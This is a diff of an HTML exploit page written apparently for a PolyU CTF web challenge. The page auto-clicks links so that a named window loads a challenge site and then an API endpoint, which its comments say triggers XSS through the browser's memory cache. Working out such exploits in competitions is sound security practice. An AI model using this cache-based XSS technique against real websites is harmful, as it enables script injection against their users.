@@ -1,27 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>Pwn</title>
 </head>
 <body>
-    <h1>Running Exploit v3...</h1>
-    <a id="pwn" target="exploitWindow">Click here</a>
-    <script>
-        const CHAL_URL = "http://chal.polyuctf.com:43265";
-        // REPLACE WITH YOUR NEW SITE ID
-        const SITE_ID = "5fb4d462e40605251d64c48c2ebc1919bf1119b117922663a0dd070081ded69e"; 
-        
-        const link = document.getElementById("pwn");
+    <h1>Firing Exploit...</h1>
+    
+    <!-- Link 1: Opens the challenge page in a window named 'pwn_window' to cache the payload -->
+    <a id="step1" href="http://chal.polyuctf.com:43069/sites/7e1c8a4509095741cb257da86c4d660f189efbba434b12bd623a0462b2386bc0" target="pwn_window">Step 1</a>
+    
+    <!-- Link 2: Hits the API endpoint in that same named window, triggering the XSS via Memory Cache -->
+    <a id="step2" href="http://chal.polyuctf.com:43069/api/sites/7e1c8a4509095741cb257da86c4d660f189efbba434b12bd623a0462b2386bc0" target="pwn_window">Step 2</a>
 
-        // Step 1: Open the challenge site in a new tab named "exploitWindow"
-        link.href = `${CHAL_URL}/sites/${SITE_ID}`;
-        link.click();
+    <script>
+        // 1. Immediately click the first link to open the popup and cache the API data
+        document.getElementById('step1').click();
         
-        // Step 2: 3 seconds later, click the exact same link target again, 
-        // overwriting that specific window to hit the cached API!
+        // 2. Wait 3 seconds for the XHR to finish caching, then click the second link
         setTimeout(() => {
-            link.href = `${CHAL_URL}/api/sites/${SITE_ID}/content`;
-            link.click();
+            document.getElementById('step2').click();
         }, 3000);
     </script>
 </body>
